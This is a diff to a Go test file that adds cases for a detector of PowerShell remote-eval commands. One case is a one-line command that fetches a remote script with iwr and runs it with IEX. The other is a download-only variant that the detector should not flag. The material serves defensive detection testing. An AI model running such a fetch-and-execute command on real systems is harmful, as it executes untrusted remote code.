@@ -365,6 +365,20 @@ func TestCurlExecutionPatterns(t *testing.T) {
 			t.Fatalf("unexpected curlBacktickExecPattern match for %q", line)
 		}
 	})
+
+	t.Run("detects powershell remote eval form", func(t *testing.T) {
+		line := "powershell -NoProfile -Command \"IEX (iwr https://example.com/bootstrap.ps1 -UseBasicParsing)\""
+		if !powerShellRemoteEvalPattern.MatchString(line) {
+			t.Fatalf("expected powerShellRemoteEvalPattern to match %q", line)
+		}
+	})
+
+	t.Run("does not match powershell fetch without eval", func(t *testing.T) {
+		line := "powershell -NoProfile -Command \"iwr https://example.com/bootstrap.ps1 -OutFile bootstrap.ps1\""
+		if powerShellRemoteEvalPattern.MatchString(line) {
+			t.Fatalf("unexpected powerShellRemoteEvalPattern match for %q", line)
+		}
+	})
 }
 
 func TestEncodedCommandExecPattern(t *testing.T) {
